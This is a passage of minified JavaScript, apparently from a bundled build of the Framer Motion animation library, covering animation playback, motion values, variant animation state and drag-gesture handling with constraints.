Ke=Math.floor(Ce),At=Ce%1;!At&&Ce>=1&&(At=1),At===1&&Ke--,Ke=Math.min(Ke,c+1),!!(Ke%2)&&(h==="reverse"?(At=1-At,d&&(At-=d/$)):h==="mirror"&&(be=J)),de=Nn(0,1,At)*$}const pe=te?{done:!1,value:s[0]}:be.next(de);O&&(pe.value=O(pe.value));let{done:Te}=pe;!te&&Ae!==null&&(Te=w>=0?H>=ae:H<=0);const xe=X===null&&(G==="finished"||G==="running"&&Te);return y&&y(pe.value),xe&&U(),pe},oe=()=>{R&&R.stop(),R=void 0},ue=()=>{G="idle",oe(),T(),L(),ie=ge=null},U=()=>{G="finished",m&&m(),oe(),T()},Q=()=>{if(P)return;R||(R=r(he));const E=R.now();p&&p(),X!==null?ie=E-X:(!ie||G==="finished")&&(ie=E),G==="finished"&&L(),ge=ie,X=null,G="running",R.start()};i&&Q();const q={then(E,B){return C.then(E,B)},get time(){return un(H)},set time(E){E=ui(E),H=E,X!==null||!R||w===0?X=E:ie=R.now()-E/w},get duration(){const E=W.calculatedDuration===null?of(W):W.calculatedDuration;return un(E)},get speed(){return w},set speed(E){E===w||!R||(w=E,q.time=un(H))},get state(){return G},play:Q,pause:()=>{G="paused",X=H},stop:()=>{P=!0,G!=="idle"&&(G="idle",f&&f(),ue())},cancel:()=>{ge!==null&&he(ge),ue()},complete:()=>{G="finished"},sample:E=>(ie=0,he(E))};return q}function mk(i){let t;return()=>(t===void 0&&(t=i()),t)}const yk=mk(()=>Object.hasOwnProperty.call(Element.prototype,"animate")),bk=new Set(["opacity","clipPath","filter","transform","backgroundColor"]),_o=10,vk=2e4,wk=(i,t)=>t.type==="spring"||i==="backgroundColor"||!Xg(t.ease);function kk(i,t,{onUpdate:r,onComplete:s,...a}){if(!(yk()&&bk.has(t)&&!a.repeatDelay&&a.repeatType!=="mirror"&&a.damping!==0&&a.type!=="inertia"))return!1;let d=!1,h,p,f=!1;const m=()=>{p=new Promise(M=>{h=M})};m();let{keyframes:y,duration:v=300,ease:w,times:P}=a;if(wk(t,a)){const M=Ko({...a,repeat:0,delay:0});let O={done:!1,value:y[0]};const W=[];let J=0;for(;!O.done&&J<vk;)O=M.sample(J),W.push(O.value),J+=_o;P=void 0,y=W,v=J-_o,w="linear"}const T=_0(i.owner.current,t,y,{...a,duration:v,ease:w,times:P}),C=()=>{f=!1,T.cancel()},L=()=>{f=!0,_e.update(C),h(),m()};return T.onfinish=()=>{f||(i.set(R0(y,a)),s&&s(),L())},{then(M,O){return p.then(M,O)},attachTimeline(M){return T.timeline=M,T.onfinish=null,Ue},get time(){return un(T.currentTime||0)},set time(M){T.currentTime=ui(M)},get speed(){return T.playbackRate},set speed(M){T.playbackRate=M},get duration(){return un(v)},play:()=>{d||(T.play(),hn(C))},pause:()=>T.pause(),stop:()=>{if(d=!0,T.playState==="idle")return;const{currentTime:M}=T;if(M){const O=Ko({...a,autoplay:!1});i.setWithVelocity(O.sample(M-_o).value,O.sample(M).value,_o)}L()},complete:()=>{f||T.finish()},cancel:L}}function xk({keyframes:i,delay:t,onUpdate:r,onComplete:s}){const a=()=>(r&&r(i[i.length-1]),s&&s(),{time:0,speed:1,duration:0,play:Ue,pause:Ue,stop:Ue,then:c=>(c(),Promise.resolve()),cancel:Ue,complete:Ue});return t?Ko({keyframes:[0,1],duration:0,delay:t,onComplete:a}):a()}const Tk={type:"spring",stiffness:500,damping:25,restSpeed:10},Sk=i=>({type:"spring",stiffness:550,damping:i===0?2*Math.sqrt(550):30,restSpeed:10}),Ak={type:"keyframes",duration:.8},Ck={type:"keyframes",ease:[.25,.1,.35,1],duration:.3},Ek=(i,{keyframes:t})=>t.length>2?Ak:fi.has(i)?i.startsWith("scale")?Sk(t[1]):Tk:Ck,Nc=(i,t)=>i==="zIndex"?!1:!!(typeof t=="number"||Array.isArray(t)||typeof t=="string"&&(Fn.test(t)||t==="0")&&!t.startsWith("url(")),Pk=new Set(["brightness","contrast","saturate","opacity"]);function Ik(i){const[t,r]=i.slice(0,-1).split("(");if(t==="drop-shadow")return i;const[s]=r.match(ra)||[];if(!s)return i;const a=r.replace(s,"");let c=Pk.has(t)?1:0;return s!==r&&(c*=100),t+"("+c+a+")"}const _k=/([a-z-]*)\(.*?\)/g,Fc={...Fn,getAnimatableNone:i=>{const t=i.match(_k);return t?t.map(Ik).join(" "):i}},Rk={...Og,color:ct,backgroundColor:ct,outlineColor:ct,fill:ct,stroke:ct,borderColor:ct,borderTopColor:ct,borderRightColor:ct,borderBottomColor:ct,borderLeftColor:ct,filter:Fc,WebkitFilter:Fc},kd=i=>Rk[i];function xm(i,t){let r=kd(i);return r!==Fc&&(r=Fn),r.getAnimatableNone?r.getAnimatableNone(t):void 0}const Tm=i=>/^0[^.\s]+$/.test(i);function Dk(i){if(typeof i=="number")return i===0;if(i!==null)return i==="none"||i==="0"||Tm(i)}function Mk(i,t,r,s){const a=Nc(t,r);let c;Array.isArray(r)?c=[...r]:c=[null,r];const d=s.from!==void 0?s.from:i.get();let h;const p=[];for(let f=0;f<c.length;f++)c[f]===null&&(c[f]=f===0?d:c[f-1]),Dk(c[f])&&p.push(f),typeof c[f]=="string"&&c[f]!=="none"&&c[f]!=="0"&&(h=c[f]);if(a&&p.length&&h)for(let f=0;f<p.length;f++){const m=p[f];c[m]=xm(t,h)}return c}function jk({when:i,delay:t,delayChildren:r,staggerChildren:s,staggerDirection:a,repeat:c,repeatType:d,repeatDelay:h,from:p,elapsed:f,...m}){return!!Object.keys(m).length}function xd(i,t){return i[t]||i.default||i}const Ok={skipAnimations:!1},Td=(i,t,r,s={})=>a=>{const c=xd(s,i)||{},d=c.delay||s.delay||0;let{elapsed:h=0}=s;h=h-ui(d);const p=Mk(t,i,r,c),f=p[0],m=p[p.length-1],y=Nc(i,f),v=Nc(i,m);let w={keyframes:p,velocity:t.getVelocity(),ease:"easeOut",...c,delay:-h,onUpdate:P=>{t.set(P),c.onUpdate&&c.onUpdate(P)},onComplete:()=>{a(),c.onComplete&&c.onComplete()}};if(jk(c)||(w={...w,...Ek(i,w)}),w.duration&&(w.duration=ui(w.duration)),w.repeatDelay&&(w.repeatDelay=ui(w.repeatDelay)),!y||!v||I0.current||c.type===!1||Ok.skipAnimations)return xk(w);if(!s.isHandoff&&t.owner&&t.owner.current instanceof HTMLElement&&!t.owner.getProps().onUpdate){const P=kk(t,i,w);if(P)return P}return Ko(w)};function Jo(i){return!!(mt(i)&&i.add)}const Sm=i=>/^\-?\d*\.?\d+$/.test(i);function Sd(i,t){i.indexOf(t)===-1&&i.push(t)}function Ad(i,t){const r=i.indexOf(t);r>-1&&i.splice(r,1)}class Cd{constructor(){this.subscriptions=[]}add(t){return Sd(this.subscriptions,t),()=>Ad(this.subscriptions,t)}notify(t,r,s){const a=this.subscriptions.length;if(a)if(a===1)this.subscriptions[0](t,r,s);else for(let c=0;c<a;c++){const d=this.subscriptions[c];d&&d(t,r,s)}}getSize(){return this.subscriptions.length}clear(){this.subscriptions.length=0}}const Lk=i=>!isNaN(parseFloat(i));class Bk{constructor(t,r={}){this.version="10.18.0",this.timeDelta=0,this.lastUpdated=0,this.canTrackVelocity=!1,this.events={},this.updateAndNotify=(s,a=!0)=>{this.prev=this.current,this.current=s;const{delta:c,timestamp:d}=st;this.lastUpdated!==d&&(this.timeDelta=c,this.lastUpdated=d,_e.postRender(this.scheduleVelocityCheck)),this.prev!==this.current&&this.events.change&&this.events.change.notify(this.current),this.events.velocityChange&&this.events.velocityChange.notify(this.getVelocity()),a&&this.events.renderRequest&&this.events.renderRequest.notify(this.current)},this.scheduleVelocityCheck=()=>_e.postRender(this.velocityCheck),this.velocityCheck=({timestamp:s})=>{s!==this.lastUpdated&&(this.prev=this.current,this.events.velocityChange&&this.events.velocityChange.notify(this.getVelocity()))},this.hasAnimated=!1,this.prev=this.current=t,this.canTrackVelocity=Lk(this.current),this.owner=r.owner}onChange(t){return this.on("change",t)}on(t,r){this.events[t]||(this.events[t]=new Cd);const s=this.events[t].add(r);return t==="change"?()=>{s(),_e.read(()=>{this.events.change.getSize()||this.stop()})}:s}clearListeners(){for(const t in this.events)this.events[t].clear()}attach(t,r){this.passiveEffect=t,this.stopPassiveEffect=r}set(t,r=!0){!r||!this.passiveEffect?this.updateAndNotify(t,r):this.passiveEffect(t,this.updateAndNotify)}setWithVelocity(t,r,s){this.set(r),this.prev=t,this.timeDelta=s}jump(t){this.updateAndNotify(t),this.prev=t,this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}get(){return this.current}getPrevious(){return this.prev}getVelocity(){return this.canTrackVelocity?vm(parseFloat(this.current)-parseFloat(this.prev),this.timeDelta):0}start(t){return this.stop(),new Promise(r=>{this.hasAnimated=!0,this.animation=t(r),this.events.animationStart&&this.events.animationStart.notify()}).then(()=>{this.events.animationComplete&&this.events.animationComplete.notify(),this.clearAnimation()})}stop(){this.animation&&(this.animation.stop(),this.events.animationCancel&&this.events.animationCancel.notify()),this.clearAnimation()}isAnimating(){return!!this.animation}clearAnimation(){delete this.animation}destroy(){this.clearListeners(),this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}}function tr(i,t){return new Bk(i,t)}const Am=i=>t=>t.test(i),Nk={test:i=>i==="auto",parse:i=>i},Cm=[gi,le,Yt,Mn,Hw,$w,Nk],Gr=i=>Cm.find(Am(i)),Fk=[...Cm,ct,Fn],zk=i=>Fk.find(Am(i));function Vk(i,t,r){i.hasValue(t)?i.getValue(t).set(r):i.addValue(t,tr(r))}function Uk(i,t){const r=oa(i,t);let{transitionEnd:s={},transition:a={},...c}=r?i.makeTargetAnimatable(r,!1):{};c={...c,...s};for(const d in c){const h=s0(c[d]);Vk(i,d,h)}}function Wk(i,t,r){var s,a;const c=Object.keys(t).filter(h=>!i.hasValue(h)),d=c.length;if(d)for(let h=0;h<d;h++){const p=c[h],f=t[p];let m=null;Array.isArray(f)&&(m=f[0]),m===null&&(m=(a=(s=r[p])!==null&&s!==void 0?s:i.readValue(p))!==null&&a!==void 0?a:t[p]),m!=null&&(typeof m=="string"&&(Sm(m)||Tm(m))?m=parseFloat(m):!zk(m)&&Fn.test(f)&&(m=xm(p,f)),i.addValue(p,tr(m,{owner:i})),r[p]===void 0&&(r[p]=m),m!==null&&i.setBaseTarget(p,m))}}function $k(i,t){return t?(t[i]||t.default||t).from:void 0}function Hk(i,t,r){const s={};for(const a in i){const c=$k(a,t);if(c!==void 0)s[a]=c;else{const d=r.getValue(a);d&&(s[a]=d.get())}}return s}function Gk({protectedKeys:i,needsAnimating:t},r){const s=i.hasOwnProperty(r)&&t[r]!==!0;return t[r]=!1,s}function qk(i,t){const r=i.get();if(Array.isArray(t)){for(let s=0;s<t.length;s++)if(t[s]!==r)return!0}else return r!==t}function Em(i,t,{delay:r=0,transitionOverride:s,type:a}={}){let{transition:c=i.getDefaultTransition(),transitionEnd:d,...h}=i.makeTargetAnimatable(t);const p=i.getValue("willChange");s&&(c=s);const f=[],m=a&&i.animationState&&i.animationState.getState()[a];for(const y in h){const v=i.getValue(y),w=h[y];if(!v||w===void 0||m&&Gk(m,y))continue;const P={delay:r,elapsed:0,...xd(c||{},y)};if(window.HandoffAppearAnimations){const L=i.getProps()[Pg];if(L){const R=window.HandoffAppearAnimations(L,y,v,_e);R!==null&&(P.elapsed=R,P.isHandoff=!0)}}let T=!P.isHandoff&&!qk(v,w);if(P.type==="spring"&&(v.getVelocity()||P.velocity)&&(T=!1),v.animation&&(T=!1),T)continue;v.start(Td(y,v,w,i.shouldReduceMotion&&fi.has(y)?{type:!1}:P));const C=v.animation;Jo(p)&&(p.add(y),C.then(()=>p.remove(y))),f.push(C)}return d&&Promise.all(f).then(()=>{d&&Uk(i,d)}),f}function zc(i,t,r={}){const s=oa(i,t,r.custom);let{transition:a=i.getDefaultTransition()||{}}=s||{};r.transitionOverride&&(a=r.transitionOverride);const c=s?()=>Promise.all(Em(i,s,r)):()=>Promise.resolve(),d=i.variantChildren&&i.variantChildren.size?(p=0)=>{const{delayChildren:f=0,staggerChildren:m,staggerDirection:y}=a;return Kk(i,t,f+p,m,y,r)}:()=>Promise.resolve(),{when:h}=a;if(h){const[p,f]=h==="beforeChildren"?[c,d]:[d,c];return p().then(()=>f())}else return Promise.all([c(),d(r.delay)])}function Kk(i,t,r=0,s=0,a=1,c){const d=[],h=(i.variantChildren.size-1)*s,p=a===1?(f=0)=>f*s:(f=0)=>h-f*s;return Array.from(i.variantChildren).sort(Jk).forEach((f,m)=>{f.notify("AnimationStart",t),d.push(zc(f,t,{...c,delay:r+p(m)}).then(()=>f.notify("AnimationComplete",t)))}),Promise.all(d)}function Jk(i,t){return i.sortNodePosition(t)}function Qk(i,t,r={}){i.notify("AnimationStart",t);let s;if(Array.isArray(t)){const a=t.map(c=>zc(i,c,r));s=Promise.all(a)}else if(typeof t=="string")s=zc(i,t,r);else{const a=typeof t=="function"?oa(i,t,r.custom):t;s=Promise.all(Em(i,a,r))}return s.then(()=>i.notify("AnimationComplete",t))}const Yk=[...ad].reverse(),Xk=ad.length;function Zk(i){return t=>Promise.all(t.map(({animation:r,options:s})=>Qk(i,r,s)))}function ex(i){let t=Zk(i);const r=nx();let s=!0;const a=(p,f)=>{const m=oa(i,f);if(m){const{transition:y,transitionEnd:v,...w}=m;p={...p,...w,...v}}return p};function c(p){t=p(i)}function d(p,f){const m=i.getProps(),y=i.getVariantContext(!0)||{},v=[],w=new Set;let P={},T=1/0;for(let L=0;L<Xk;L++){const R=Yk[L],M=r[R],O=m[R]!==void 0?m[R]:y[R],W=os(O),J=R===f?M.isActive:null;J===!1&&(T=L);let G=O===y[R]&&O!==m[R]&&W;if(G&&s&&i.manuallyAnimateOnMount&&(G=!1),M.protectedKeys={...P},!M.isActive&&J===null||!O&&!M.prevProp||na(O)||typeof O=="boolean")continue;let ie=tx(M.prevProp,O)||R===f&&M.isActive&&!G&&W||L>T&&W,ge=!1;const Ae=Array.isArray(O)?O:[O];let $=Ae.reduce(a,{});J===!1&&($={});const{prevResolvedValues:ae={}}=M,H={...ae,...$},he=oe=>{ie=!0,w.has(oe)&&(ge=!0,w.delete(oe)),M.needsAnimating[oe]=!0};for(const oe in H){const ue=$[oe],U=ae[oe];if(P.hasOwnProperty(oe))continue;let Q=!1;Ho(ue)&&Ho(U)?Q=!Qg(ue,U):Q=ue!==U,Q?ue!==void 0?he(oe):w.add(oe):ue!==void 0&&w.has(oe)?he(oe):M.protectedKeys[oe]=!0}M.prevProp=O,M.prevResolvedValues=$,M.isActive&&(P={...P,...$}),s&&i.blockInitialAnimation&&(ie=!1),ie&&(!G||ge)&&v.push(...Ae.map(oe=>({animation:oe,options:{type:R,...p}})))}if(w.size){const L={};w.forEach(R=>{const M=i.getBaseTarget(R);M!==void 0&&(L[R]=M)}),v.push({animation:L})}let C=!!v.length;return s&&(m.initial===!1||m.initial===m.animate)&&!i.manuallyAnimateOnMount&&(C=!1),s=!1,C?t(v):Promise.resolve()}function h(p,f,m){var y;if(r[p].isActive===f)return Promise.resolve();(y=i.variantChildren)===null||y===void 0||y.forEach(w=>{var P;return(P=w.animationState)===null||P===void 0?void 0:P.setActive(p,f)}),r[p].isActive=f;const v=d(m,p);for(const w in r)r[w].protectedKeys={};return v}return{animateChanges:d,setActive:h,setAnimateFunction:c,getState:()=>r}}function tx(i,t){return typeof t=="string"?t!==i:Array.isArray(t)?!Qg(t,i):!1}function ti(i=!1){return{isActive:i,protectedKeys:{},needsAnimating:{},prevResolvedValues:{}}}function nx(){return{animate:ti(!0),whileInView:ti(),whileHover:ti(),whileTap:ti(),whileDrag:ti(),whileFocus:ti(),exit:ti()}}class ix extends zn{constructor(t){super(t),t.animationState||(t.animationState=ex(t))}updateAnimationControlsSubscription(){const{animate:t}=this.node.getProps();this.unmount(),na(t)&&(this.unmount=t.subscribe(this.node))}mount(){this.updateAnimationControlsSubscription()}update(){const{animate:t}=this.node.getProps(),{animate:r}=this.node.prevProps||{};t!==r&&this.updateAnimationControlsSubscription()}unmount(){}}let rx=0;class sx extends zn{constructor(){super(...arguments),this.id=rx++}update(){if(!this.node.presenceContext)return;const{isPresent:t,onExitComplete:r,custom:s}=this.node.presenceContext,{isPresent:a}=this.node.prevPresenceContext||{};if(!this.node.animationState||t===a)return;const c=this.node.animationState.setActive("exit",!t,{custom:s??this.node.getProps().custom});r&&!t&&c.then(()=>r(this.id))}mount(){const{register:t}=this.node.presenceContext||{};t&&(this.unmount=t(this.id))}unmount(){}}const ox={animation:{Feature:ix},exit:{Feature:sx}},af=(i,t)=>Math.abs(i-t);function ax(i,t){const r=af(i.x,t.x),s=af(i.y,t.y);return Math.sqrt(r**2+s**2)}class Pm{constructor(t,r,{transformPagePoint:s,contextWindow:a,dragSnapToOrigin:c=!1}={}){if(this.startEvent=null,this.lastMoveEvent=null,this.lastMoveEventInfo=null,this.handlers={},this.contextWindow=window,this.updatePoint=()=>{if(!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const y=vc(this.lastMoveEventInfo,this.history),v=this.startEvent!==null,w=ax(y.offset,{x:0,y:0})>=3;if(!v&&!w)return;const{point:P}=y,{timestamp:T}=st;this.history.push({...P,timestamp:T});const{onStart:C,onMove:L}=this.handlers;v||(C&&C(this.lastMoveEvent,y),this.startEvent=this.lastMoveEvent),L&&L(this.lastMoveEvent,y)},this.handlePointerMove=(y,v)=>{this.lastMoveEvent=y,this.lastMoveEventInfo=bc(v,this.transformPagePoint),_e.update(this.updatePoint,!0)},this.handlePointerUp=(y,v)=>{this.end();const{onEnd:w,onSessionEnd:P,resumeAnimation:T}=this.handlers;if(this.dragSnapToOrigin&&T&&T(),!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const C=vc(y.type==="pointercancel"?this.lastMoveEventInfo:bc(v,this.transformPagePoint),this.history);this.startEvent&&w&&w(y,C),P&&P(y,C)},!Hg(t))return;this.dragSnapToOrigin=c,this.handlers=r,this.transformPagePoint=s,this.contextWindow=a||window;const d=sa(t),h=bc(d,this.transformPagePoint),{point:p}=h,{timestamp:f}=st;this.history=[{...p,timestamp:f}];const{onSessionStart:m}=r;m&&m(t,vc(h,this.history)),this.removeListeners=Bn(dn(this.contextWindow,"pointermove",this.handlePointerMove),dn(this.contextWindow,"pointerup",this.handlePointerUp),dn(this.contextWindow,"pointercancel",this.handlePointerUp))}updateHandlers(t){this.handlers=t}end(){this.removeListeners&&this.removeListeners(),hn(this.updatePoint)}}function bc(i,t){return t?{point:t(i.point)}:i}function lf(i,t){return{x:i.x-t.x,y:i.y-t.y}}function vc({point:i},t){return{point:i,delta:lf(i,Im(t)),offset:lf(i,lx(t)),velocity:cx(t,.1)}}function lx(i){return i[0]}function Im(i){return i[i.length-1]}function cx(i,t){if(i.length<2)return{x:0,y:0};let r=i.length-1,s=null;const a=Im(i);for(;r>=0&&(s=i[r],!(a.timestamp-s.timestamp>ui(t)));)r--;if(!s)return{x:0,y:0};const c=un(a.timestamp-s.timestamp);if(c===0)return{x:0,y:0};const d={x:(a.x-s.x)/c,y:(a.y-s.y)/c};return d.x===1/0&&(d.x=0),d.y===1/0&&(d.y=0),d}function St(i){return i.max-i.min}function Vc(i,t=0,r=.01){return Math.abs(i-t)<=r}function cf(i,t,r,s=.5){i.origin=s,i.originPoint=Be(t.min,t.max,i.origin),i.scale=St(r)/St(t),(Vc(i.scale,1,1e-4)||isNaN(i.scale))&&(i.scale=1),i.translate=Be(r.min,r.max,i.origin)-i.originPoint,(Vc(i.translate)||isNaN(i.translate))&&(i.translate=0)}function ts(i,t,r,s){cf(i.x,t.x,r.x,s?s.originX:void 0),cf(i.y,t.y,r.y,s?s.originY:void 0)}function df(i,t,r){i.min=r.min+t.min,i.max=i.min+St(t)}function dx(i,t,r){df(i.x,t.x,r.x),df(i.y,t.y,r.y)}function uf(i,t,r){i.min=t.min-r.min,i.max=i.min+St(t)}function ns(i,t,r){uf(i.x,t.x,r.x),uf(i.y,t.y,r.y)}function ux(i,{min:t,max:r},s){return t!==void 0&&i<t?i=s?Be(t,i,s.min):Math.max(i,t):r!==void 0&&i>r&&(i=s?Be(r,i,s.max):Math.min(i,r)),i}function hf(i,t,r){return{min:t!==void 0?i.min+t:void 0,max:r!==void 0?i.max+r-(i.max-i.min):void 0}}function hx(i,{top:t,left:r,bottom:s,right:a}){return{x:hf(i.x,r,a),y:hf(i.y,t,s)}}function pf(i,t){let r=t.min-i.min,s=t.max-i.max;return t.max-t.min<i.max-i.min&&([r,s]=[s,r]),{min:r,max:s}}function px(i,t){return{x:pf(i.x,t.x),y:pf(i.y,t.y)}}function fx(i,t){let r=.5;const s=St(i),a=St(t);return a>s?r=ls(t.min,t.max-s,i.min):s>a&&(r=ls(i.min,i.max-a,t.min)),Nn(0,1,r)}function gx(i,t){const r={};return t.min!==void 0&&(r.min=t.min-i.min),t.max!==void 0&&(r.max=t.max-i.min),r}const Uc=.35;function mx(i=Uc){return i===!1?i=0:i===!0&&(i=Uc),{x:ff(i,"left","right"),y:ff(i,"top","bottom")}}function ff(i,t,r){return{min:gf(i,t),max:gf(i,r)}}function gf(i,t){return typeof i=="number"?i:i[t]||0}const mf=()=>({translate:0,scale:1,origin:0,originPoint:0}),Xi=()=>({x:mf(),y:mf()}),yf=()=>({min:0,max:0}),$e=()=>({x:yf(),y:yf()});function jt(i){return[i("x"),i("y")]}function _m({top:i,left:t,right:r,bottom:s}){return{x:{min:t,max:r},y:{min:i,max:s}}}function yx({x:i,y:t}){return{top:t.min,right:i.max,bottom:t.max,left:i.min}}function bx(i,t){if(!t)return i;const r=t({x:i.left,y:i.top}),s=t({x:i.right,y:i.bottom});return{top:r.y,left:r.x,bottom:s.y,right:s.x}}function wc(i){return i===void 0||i===1}function Wc({scale:i,scaleX:t,scaleY:r}){return!wc(i)||!wc(t)||!wc(r)}function ri(i){return Wc(i)||Rm(i)||i.z||i.rotate||i.rotateX||i.rotateY}function Rm(i){return bf(i.x)||bf(i.y)}function bf(i){return i&&i!=="0%"}function Qo(i,t,r){const s=i-r,a=t*s;return r+a}function vf(i,t,r,s,a){return a!==void 0&&(i=Qo(i,a,s)),Qo(i,r,s)+t}function $c(i,t=0,r=1,s,a){i.min=vf(i.min,t,r,s,a),i.max=vf(i.max,t,r,s,a)}function Dm(i,{x:t,y:r}){$c(i.x,t.translate,t.scale,t.originPoint),$c(i.y,r.translate,r.scale,r.originPoint)}function vx(i,t,r,s=!1){const a=r.length;if(!a)return;t.x=t.y=1;let c,d;for(let h=0;h<a;h++){c=r[h],d=c.projectionDelta;const p=c.instance;p&&p.style&&p.style.display==="contents"||(s&&c.options.layoutScroll&&c.scroll&&c!==c.root&&Zi(i,{x:-c.scroll.offset.x,y:-c.scroll.offset.y}),d&&(t.x*=d.x.scale,t.y*=d.y.scale,Dm(i,d)),s&&ri(c.latestValues)&&Zi(i,c.latestValues))}t.x=wf(t.x),t.y=wf(t.y)}function wf(i){return Number.isInteger(i)||i>1.0000000000001||i<.999999999999?i:1}function jn(i,t){i.min=i.min+t,i.max=i.max+t}function kf(i,t,[r,s,a]){const c=t[a]!==void 0?t[a]:.5,d=Be(i.min,i.max,c);$c(i,t[r],t[s],d,t.scale)}const wx=["x","scaleX","originX"],kx=["y","scaleY","originY"];function Zi(i,t){kf(i.x,t,wx),kf(i.y,t,kx)}function Mm(i,t){return _m(bx(i.getBoundingClientRect(),t))}function xx(i,t,r){const s=Mm(i,r),{scroll:a}=t;return a&&(jn(s.x,a.offset.x),jn(s.y,a.offset.y)),s}const jm=({current:i})=>i?i.ownerDocument.defaultView:null,Tx=new WeakMap;class Sx{constructor(t){this.openGlobalLock=null,this.isDragging=!1,this.currentDirection=null,this.originPoint={x:0,y:0},this.constraints=!1,this.hasMutatedConstraints=!1,this.elastic=$e(),this.visualElement=t}start(t,{snapToCursor:r=!1}={}){const{presenceContext:s}=this.visualElement;if(s&&s.isPresent===!1)return;const a=m=>{const{dragSnapToOrigin:y}=this.getProps();y?this.pauseAnimation():this.stopAnimation(),r&&this.snapToCursor(sa(m,"page").point)},c=(m,y)=>{const{drag:v,dragPropagation:w,onDragStart:P}=this.getProps();if(v&&!w&&(this.openGlobalLock&&this.openGlobalLock(),this.openGlobalLock=qg(v),!this.openGlobalLock))return;this.isDragging=!0,this.currentDirection=null,this.resolveConstraints(),this.visualElement.projection&&(this.visualElement.projection.isAnimationBlocked=!0,this.visualElement.projection.target=void 0),jt(C=>{let L=this.getAxisMotionValue(C).get()||0;if(Yt.test(L)){const{projection:R}=this.visualElement;if(R&&R.layout){const M=R.layout.layoutBox[C];M&&(L=St(M)*(parseFloat(L)/100))}}this.originPoint[C]=L}),P&&_e.update(()=>P(m,y),!1,!0);const{animationState:T}=this.visualElement;T&&T.setActive("whileDrag",!0)},d=(m,y)=>{const{dragPropagation:v,dragDirectionLock:w,onDirectionLock:P,onDrag:T}=this.getProps();if(!v&&!this.openGlobalLock)return;const{offset:C}=y;if(w&&this.currentDirection===null){this.currentDirection=Ax(C),this.currentDirection!==null&&P&&P(this.currentDirection);return}this.updateAxis("x",y.point,C),this.updateAxis("y",y.point,C),this.visualElement.render(),T&&T(m,y)},h=(m,y)=>this.stop(m,y),p=()=>jt(m=>{var y;return this.getAnimationState(m)==="paused"&&((y=this.getAxisMotionValue(m).animation)===null||y===void 0?void 0:y.play())}),{dragSnapToOrigin:f}=this.getProps();this.panSession=new Pm(t,{onSessionStart:a,onStart:c,onMove:d,onSessionEnd:h,resumeAnimation:p},{transformPagePoint:this.visualElement.getTransformPagePoint(),dragSnapToOrigin:f,contextWindow:jm(this.visualElement)})}stop(t,r){const s=this.isDragging;if(this.cancel(),!s)return;const{velocity:a}=r;this.startAnimation(a);const{onDragEnd:c}=this.getProps();c&&_e.update(()=>c(t,r))}cancel(){this.isDragging=!1;const{projection:t,animationState:r}=this.visualElement;t&&(t.isAnimationBlocked=!1),this.panSession&&this.panSession.end(),this.panSession=void 0;const{dragPropagation:s}=this.getProps();!s&&this.openGlobalLock&&(this.openGlobalLock(),this.openGlobalLock=null),r&&r.setActive("whileDrag",!1)}updateAxis(t,r,s){const{drag:a}=this.getProps();if(!s||!Ro(t,a,this.currentDirection))return;const c=this.getAxisMotionValue(t);let d=this.originPoint[t]+s[t];this.constraints&&this.constraints[t]&&(d=ux(d,this.constraints[t],this.elastic[t])),c.set(d)}resolveConstraints(){var t;const{dragConstraints:r,dragElastic:s}=this.getProps(),a=this.visualElement.projection&&!this.visualElement.projection.layout?this.visualElement.projection.measure(!1):(t=this.visualElement.projection)===null||t===void 0?void 0:t.layout,c=this.constraints;r&&Qi(r)?this.constraints||(this.constraints=this.resolveRefConstraints()):r&&a?this.constraints=hx(a.layoutBox,r):this.constraints=!1,this.elastic=mx(s),c!==this.constraints&&a&&this.constraints&&!this.hasMutatedConstraints&&jt(d=>{this.getAxisMotionValue(d)&&(this.constraints[d]=gx(a.layoutBox[d],this.constraints[d]))})}resolveRefConstraints(){const{dragConstraints:t,onMeasureDragConstraints:r}=this.getProps();if(!t||!Qi(t))return!1;const s=t.current,{projection:a}=this.visualElement;if(!a||!a.layout)return!1;const c=xx(s,a.root,this.visualElement.getTransformPagePoint());let d=px(a.layout.layoutBox,c);if(r){const h=r(yx(d));this.hasMutatedConstraints=!!h,h&&(d=_m(h))}return d}startAnimation(t){const{drag:r,dragMomentum:s,dragElastic:a,dragTransition:c,dragSnapToOrigin:d,onDragTransitionEnd:h}=this.getProps(),p=this.constraints||{},f=jt(m=>{if(!Ro(m,r,this.currentDirection))return;let y=p&&p[m]||{};d&&(y={min:0,max:0});const v=a?200:1e6,w=a?40:1e7,P={type:"inertia",velocity:s?t[m]:0,bounceStiffness:v,bounceDamping:w,timeConstant:750,restDelta:1,restSpeed:10,...c,...y};return this.startAxisValueAnimation(m,P)});return Promise.all(f).then(h)}startAxisValueAnimation(t,r){const s=this.getAxisMotionValue(t);return s.start(Td(t,s,0,r))}stopAnimation(){jt(t=>this.getAxisMotionValue(t).stop())}pauseAnimation(){jt(t=>{var r;return(r=this.getAxisMotionValue(t).animation)===null||r===void 0?void 0:r.pause()})}getAnimationState(t){var r;return(r=this.getAxisMotionValue(t).animation)===null||r===void 0?void 0:r.state}getAxisMotionValue(t){const r="_drag"+t.toUpperCase(),s=this.visualElement.getProps(),a=s[r];return a||this.visualElement.getValue(t,(s.initial?s.initial[t]:void 0)||0)}snapToCursor(t){jt(r=>{const{drag:s}=this.getProps();if(!Ro(r,s,this.currentDirection))return;const{projection:a}=this.visualElement,c=this.getAxisMotionValue(r);if(a&&a.layout){const{min:d,max:h}=a.layout.layoutBox[r];c.set(t[r]-Be(d,h,.5))}})}scalePositionWithinConstraints(){if(!this.visualElement.current)return;const{drag:t,dragConstraints:r}=this.getProps(),{projection:s}=this.visualElement;if(!Qi(r)||!s||!this.constraints)return;this.stopAnimation();const a={x:0,y:0};jt(d=>{const h=this.getAxisMotionValue(d);if(h){const p=h.get();a[d]=fx({min:p,max:p},this.constraints[d])}});const{transformTemplate:c}=this.visualElement.getProps();this.visualElement.current.style.transform=c?c({},""):"none",s.root&&s.root.updateScroll(),s.updateLayout(),this.resolveConstraints(),jt(d=>{if(!Ro(d,t,null))return;const h=this.getAxisMotionValue(d),{min:p,max:f}=this.constraints[d];h.set(Be(p,f,a[d]))})}addListeners(){if(!this.visualElement.current)return;Tx.set(this.visualElement,this);const t=this.visualElement.current,r=dn(t,"pointerdown",p=>{const{drag:f,dragListener:m=!0}=this.getProps();f&&m&&this.start(p)}),s=()=>{const{dragConstraints:p}=this.getProps();Qi(p)&&(this.constraints=this.resolveRefConstraints())},{projection:a}=this.visualElement,c=a.addEventListener("measure",s);a&&!a.layout&&(a.root&&a.root.updateScroll(),a.updateLayout()),s();const 